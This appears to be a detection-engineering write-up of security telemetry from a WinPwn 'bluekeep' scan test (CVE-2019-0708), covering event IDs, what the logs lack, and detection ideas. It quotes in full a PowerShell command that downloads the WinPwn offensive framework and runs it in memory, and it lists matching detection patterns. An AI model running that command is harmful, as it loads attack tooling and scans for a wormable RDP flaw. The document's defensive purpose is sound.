# T1046-7: Network Service Discovery — WinPwn bluekeep

## Technique Context

T1046 Network Service Discovery includes targeted vulnerability scanning to identify specific exploitable services. WinPwn's `bluekeep` module scans for systems vulnerable to CVE-2019-0708 (BlueKeep), a critical pre-authentication remote code execution vulnerability in the Windows Remote Desktop Protocol (RDP). BlueKeep affects Windows 7, Windows Server 2008, and earlier systems and enables wormable exploitation similar to MS17-010 — an attacker can achieve RCE on vulnerable hosts without any user interaction.

BlueKeep scanning targets TCP port 3389 (RDP) and probes the MS_T120 channel in the RDP connection sequence to test for the vulnerable code path. Attackers use this scan to identify legacy Windows hosts in an environment before deploying BlueKeep exploits or wormable lateral movement tools. The combination of WinPwn's in-memory download-and-execute delivery and a vulnerability scanner targeting a critical service represents a high-impact attack pattern.

## What This Dataset Contains

With Defender disabled, WinPwn downloaded and the bluekeep scanner executed. The telemetry is structurally identical to T1046-6 (MS17-10) and T1046-8 (fruit), reflecting the consistent WinPwn delivery mechanism.

Security EID 4688 captures the process creation with the full command: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput}`. The same commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` appears as in all other WinPwn tests in this batch.

Sysmon EID 1 confirms the process creation chain: child `powershell.exe` spawned from the test framework `powershell.exe`. Sysmon contains 1 EID 3 network connection event (GitHub framework download) and 1 EID 22 DNS query (raw.githubusercontent.com resolution).

The Application channel EID 15 event appears again: `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON` — the same Defender status change signal seen in T1046-6 and T1046-8, reflecting the test environment's Defender management cycle.

The PowerShell channel has 107 EID 4104 script block events and 1 EID 4103 module logging event. The cleanup block `try { Invoke-AtomicTest T1046 -TestNumbers 7 -Cleanup -Confirm:$false 2>&1 | Out-Null } catch {}` is captured in EID 4104.

The undefended dataset (1 Application, 109 PowerShell, 4 Security, 34 Sysmon) is essentially identical in structure to T1046-6 — both are WinPwn tests where the framework downloaded and executed without Defender blocking. The defended versions of these tests showed more Security events due to AMSI blocking artifacts.

## What This Dataset Does Not Contain

No RDP scanning network events appear in the sampled data despite the bluekeep module executing. Like the MS17-10 module, WinPwn's bluekeep scanner operates within PowerShell process space using .NET socket operations rather than spawning separate scanner processes. EID 3 network connections to port 3389 across multiple IPs would be in the full event stream if BlueKeep probes were made, but are not among the 20 sampled Sysmon events (which prioritize the more numerous EID 7 ImageLoad events).

No EID 5379 Credential Manager read events appear, consistent with bluekeep being a pure network vulnerability scanner rather than a credential access tool.

The vulnerability scan results are not logged in any monitored channel.

## Assessment

This dataset is structurally very similar to T1046-6. The WinPwn delivery pattern, process execution chain, and Application log indicator are identical. The differentiating element is the `bluekeep` function name in the command line, which specifically fingerprints the CVE-2019-0708 scanning intent. For a detection engineer building coverage for WinPwn activity, the four WinPwn datasets (T1046-5 through T1046-8) together provide a representative sample of the framework's behavioral footprint across different scanning modules.

The primary value over the defended version is clean execution telemetry with the network download events present and no AMSI blocking artifacts.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 where `CommandLine` contains `bluekeep` alongside `downloadstring` and `raw.githubusercontent.com` — directly identifies CVE-2019-0708 BlueKeep scanning intent.

2. The WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` in any command line or script block — cross-dataset indicator covering all four WinPwn module invocations.

3. Sysmon EID 3 network connections from `powershell.exe` to port 3389 on multiple destination IPs — RDP probing from a PowerShell process has no legitimate administrative justification on a standard workstation.

4. Sysmon EID 22 DNS query for `raw.githubusercontent.com` paired with subsequent EID 3 connections to port 3389 — documents the download-then-scan sequence.

5. Application log EID 15 (Defender status change to ON) coinciding with Security EID 4688 IEX PowerShell activity — contextual signal indicating an active test or bypass window.

6. PowerShell EID 4104 script block containing the string `bluekeep` in any context — the term has no legitimate PowerShell usage outside of security research and exploitation tools.

7. Burst of Sysmon EID 3 connections from `powershell.exe` to the same port (3389 for BlueKeep, 445 for EternalBlue) across multiple destination IPs within a short time window — automated scanning pattern distinguishable from legitimate remote desktop connections.
